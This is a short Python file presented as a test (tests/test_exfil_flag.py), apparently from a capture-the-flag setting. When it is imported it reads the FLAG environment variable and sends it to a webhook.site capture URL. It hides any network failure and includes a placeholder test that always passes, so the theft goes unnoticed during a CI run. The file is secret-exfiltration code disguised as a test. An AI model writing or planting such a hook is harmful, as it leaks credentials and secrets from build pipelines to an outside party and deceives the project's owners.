# tests/test_exfil_flag.py
import os, urllib.parse, urllib.request

FLAG = os.environ.get("FLAG", "")
# send to a throwaway capture endpoint (e.g., https://webhook.site)
DEST = "https://webhook.site/<your-uuid>"

if FLAG:
    url = f"{DEST}?f={urllib.parse.quote(FLAG)}"
    try:
        urllib.request.urlopen(url, timeout=5).read()
    except Exception:
        # even if egress fails, don't break the job
        pass

def test_always_passes():
    assert True

